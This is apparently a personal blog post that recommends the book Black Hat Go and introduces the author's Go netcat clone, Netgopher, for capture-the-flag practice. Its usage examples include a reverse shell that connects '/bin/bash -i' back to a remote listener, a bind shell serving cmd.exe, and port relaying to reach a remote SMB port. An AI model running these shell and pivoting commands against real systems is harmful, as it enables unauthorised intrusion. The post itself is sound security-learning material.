---
defaults:
  # _posts
  - scope:
      path: ""
      type: posts
    values:
      layout: single
      author_profile: true
      read_time: true
      comments: false
      share: true
      related: true
title:  "Black Hat Go and Netgopher"
date:   2021-01-30 21:00:00 +0000
header:
  overlay_image: /assets/images/posts/netgopher/go.gif
  teaser: /assets/images/posts/netgopher/go.gif
  caption: A very excellent animated gopher courtesy of 
  [egonelbre](https://github.com/egonelbre) - Check them out, they're very nice!
excerpt: "New tool who dis?"
categories:
  - Labs & Hacking
  - Programming
tags:
  - Lab
  - Go
feature_row1:
  - image_path: /assets/images/posts/netgopher/BHG.webp
    excerpt: "Black Hat Go is an excellent No Starch Press book covering the 
    use of Golang for Pen Testing, bug bounty and other offensive security 
    practices. It also has a pretty cool cover."
    url: https://nostarch.com/blackhatgo
    btn_label: "Check out The Book"
    btn_class: "btn--inverse"
---

# What's all this about?

This week, I dug out my dusty copy of Black Hat Go, a book I've been getting 
around to reading for an age. Long story short - I loved the first couple of 
chapters so much I thought I'd recommend it right off the bat. 

{% include feature_row id="feature_row1" type="left" %}

## How will this change my life?

If you're into your offensive security, using Go will add a really nice new 
skillset to your box of tricks. Go will let you build tools (simple or complex, 
up to you!) that compile to a single (fairly small) 'blob', with simple 
concurrency and thread management, excellent cross-compilation (No Wine!) and 
a compilation/testing command that's almost as simple as developing a Python 
script.  

I'd suggest that working with Go like this is probably going to be a bit easier 
if you are comfortable working with Bash or maybe a little bit of Python (even 
just being able to read these will be enough), but don't let that hold you back 
if you're keen.  I've gone through the first chapter or two so far and in just 
a couple of evenings, the book has guided me through some really nice simple TCP 
tooling. 

Most of my exposure to compiled languages comes from solving awkward Mathematical
 problems at Univeristy, so learning Go was a little outfacing because I wanted
to avoid that again. So far it's been nothing like that, it's giving me serious 
Python vibes in the ease of drafting, testing and availability/usability of 
(mostly core) Libraries, I think I might be a convert! If you're worried about 
the learning curve, you could always get the basic syntax and conventions down 
via Codeacademy, Sololearn etc.

# Netgopher

Enter Netgopher. *What is that?* I hear you cry? Well to be honest, it's the same 
example Netcat mimic that every person starting on Black Hat Go or Black Hat 
Python (Another No Starch belter) puts on their Github. That said, I've tried 
to make my super simple implementation of Netcat a bit more useful for myself
as I work CTFs and so on. 

In addition to the usual example TCP connection functionality, I've Googled it 
up and added some better command line parsing and options goodness, whilst most 
of the Netcat 'extra features' (hexdump, UDP etc.) are not included, you can do 
enough to get by on simple HackTheBox/TryHackMe/VulnHub boxes with TCP 
connections, command execution and built-in  port relaying (best bit IMHO). 

{% include figure
image_path="/assets/images/posts/netgopher/relay.gif"
alt="Example gif of Relay usage" caption="An example of a connection to connection 
relay. A Pair of listeners are started, then a connecting relay is set up, by 
starting two connections via Netgopher." %}

So if you're curious about Go, maybe you're thinking about it, why not grab this 
script and have a go? If I can do this in a couple of evenings, you definately 
can! Read the source and play with NetGopher as set out below and happy hacking! 

The rest of this post is actually a glorified excerpt from the README on the 
[Github Repo](https://github.com/blackfell/ng){:target="_blank"}. So feel free 
to check that out too if you know where you're going from here.

# Installation

You can **but probably shouldn't**  get Netgopher by running the following 
command once you have Go installed:

```
❯ go get -u "github.com/blackfell/ng"
```

## Why not? 

Well installing this way will only install ng in your local $GOPATH; 
additionally, the binary will be fairly large and compiled only for your OS. 

I wrote this little application with CTFs in mind, meaning I want a smaller 
binary, preferably with multi-platform support, so... **grab a copy of all the 
[released binaries](https://github.com/Blackfell/ng/releases/tag/v0.1) instead**
, which have been cross compileed and stripped down to ~ 2MB. 

# Examples

## Basic Usage

```
❯ ng                                                                                                 ─╯
Usage of ng:
  -c value
        Make a TCP Connection : -c 127.0.0.1:8080
  -e string
        Execute a command (quote) : -e '/bin/bash -i'
  -h    Print detailed usage.
  -l value
        Listen on a port : -l 4444
  -v    Display detailed progress messages.
```

The simplest examples are the classic netcat connect and listen functions. You 
can try this out with a listener/connection pair:

![Listener & connect example image](/assets/images/posts/netgopher/basic.gif)
{% include figure
image_path="/assets/images/posts/netgopher/basic.gif"
alt="Example gif of listener and connection usage" caption="An example of 
listeners and connections.A listener is started, then a connection made from 
the same host." %}

## CTF Use Cases
Some really common use cases I have are:
### Start an interactive Bash shell and connect back to a remote listener:
```
# Start a listener on your remote machine
❯ ng -l 1234
# Start the shell
❯ ng -c remote_host:1234 -e '/bin/bash -i'
```
### Start a shell on a bind listener.
This is useful in certail cases because you can create as many conenctions 
as you like - if your shell drops, just re-connect.
```
❯ ng -l 1234 -e 'cmd.exe'
# Now connect up to the shell
❯ ng -c serving_host:1234
C:\Windowss\system32>
^C
# Oh no! Your shell dropped - try again:
❯ ng -c serving_host:1234
C:\Windowss\system32>

```
### Forward a TCP port back to a remote listener:
```
# Start a relay on your local host
❯ ng -l 1234 -l 445
# On your remote host, forward a connection to local port 445
❯ ng -c local_hostname:1234 -c 127.0.0.1:445
# Your local machine now has access to that remote port 445 on 127.0.0.1:445
```
### Port 'spoofing' - Forward incoming connections to local port:
```
# Listen on port 1234 and forward connections to ssh server
❯ ng -l 1234 -c 127.0.0.1:22
```
# That's it!

So there you have it - if this peaked your interest why not grab a copy of 
Netgopher and have a messaround, or read the source? If you have any thoughts, 
I welcome issues, pulls, emails, tweets and more, just hit one of the socials 
below. I hope I've insipired you to check out some Go, or even program a 
little in something - anything.

## Get your copy on sale

It's also worth noting that if you're into this, 
[Humble Bundle](https://www.humblebundle.com/) also host periodic super cheap 
sales of No Starch Press books- that's where I got my copy (in eBook form) and 
it might be a good idea to keep your eyes peeled for similar sales in future. 
Peace!
